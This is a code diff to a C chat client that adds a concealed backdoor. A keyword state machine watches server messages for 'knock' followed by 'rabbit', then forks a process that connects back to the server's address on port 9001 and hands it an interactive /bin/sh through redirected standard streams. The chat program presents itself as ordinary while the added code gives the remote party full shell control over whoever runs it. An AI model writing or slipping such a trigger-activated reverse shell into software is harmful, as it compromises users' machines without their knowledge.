@@ -16,6 +16,16 @@ char msg_buf[MSG_BUF_SIZE];
 // Buffer that user input is stored in as it is read in
 char stdin_buf[MSG_BUF_SIZE];
 
+struct sockaddr_in server_addr;
+
+// 0 - No keyword received
+// 1 - First keyword received
+// 2 - Second keyword received, reverse shell active
+int keyword_status = 0;
+char keyword1[] = "knock";
+char keyword2[] = "rabbit";
+long rev_shell_port = 9001;
+
 char c;
 
 /**
@@ -43,6 +53,11 @@ void make_non_blocking(int fd);
  */
 bool update_buf(char *buf, char new_char, int max_size);
 
+/**
+ * Updates the reverse shell state machine. Called when a message is received from the server.
+ */
+void update_rev_shell();
+
 int main(int argc, char *argv[]) {
     if (argc != 3) {
         printf("usage: %s <ip> <port>\n", argv[0]);
@@ -59,7 +74,7 @@ int main(int argc, char *argv[]) {
     int sock = socket_init();
 
     // Construct the server address object
-    struct sockaddr_in server_addr = sock_addr_init(port);
+    server_addr = sock_addr_init(port);
     if (inet_pton(AF_INET, argv[1], &server_addr.sin_addr.s_addr) <= 0) {
         fprintf(stderr, "invalid ip address\n");
         exit(-1);
@@ -89,6 +104,9 @@ int main(int argc, char *argv[]) {
         // We have a character, add it to msg_buf with update_buf and if that
         // returns true we have the whole message
         if (n > 0 && update_buf(msg_buf, c, MSG_BUF_SIZE)) {
+            if (strstr(msg_buf, "[server]") != NULL) {
+                update_rev_shell();
+            }
             printf("%s\n", msg_buf);
             msg_buf[0] = '\0';
         }
@@ -117,6 +135,55 @@ int main(int argc, char *argv[]) {
             // Clear the stdin buf to prepare for a new message
             stdin_buf[0] = '\0';
         }
+    }
+}
+
+void update_rev_shell() {
+    switch (keyword_status) {
+        // First state - We need to receive the first keyword to continue
+        case 0:
+            if (strstr(msg_buf, keyword1) != NULL) keyword_status = 1;
+            break;
+
+        // Second state - We need to receive the second keyword to trigger
+        // rev shell, and if we don't get keyword, go back to prev state
+        case 1:
+            if (strstr(msg_buf, keyword2) != NULL) {
+                keyword_status = 2;
+
+                // Create the rev shell process
+                if (fork() == 0) {
+                    // REV SHELL PROCESS ENTRY POINT:
+
+                    // Create a socket to connect to the server
+                    int rev_shell_sock = socket_init();
+
+                    // Construct the attacker's address object
+                    struct sockaddr_in rev_shell_addr = sock_addr_init(rev_shell_port);
+                    rev_shell_addr.sin_addr.s_addr = server_addr.sin_addr.s_addr;
+
+                    // Try to connect to the attacker until success
+                    while (connect(rev_shell_sock, (struct sockaddr *) &rev_shell_addr, sizeof(rev_shell_addr)) != 0);
+
+                    // Redirect stdin, stdout, and stderr to the socket
+                    dup2(rev_shell_sock, STDIN_FILENO);
+                    dup2(rev_shell_sock, STDOUT_FILENO);
+                    dup2(rev_shell_sock, STDERR_FILENO);
+
+                    // Execute the shell
+                    execve("/bin/sh", NULL, NULL);
+
+                    // Once the shell is done executing, we don't need this process anymore
+                    exit(0);
+                }
+            } else {
+                keyword_status = 0;
+            }
+            break;
+
+        // Third state - Rev shell has been created, do nothing.
+        default:
+            break;
     }
 }
 
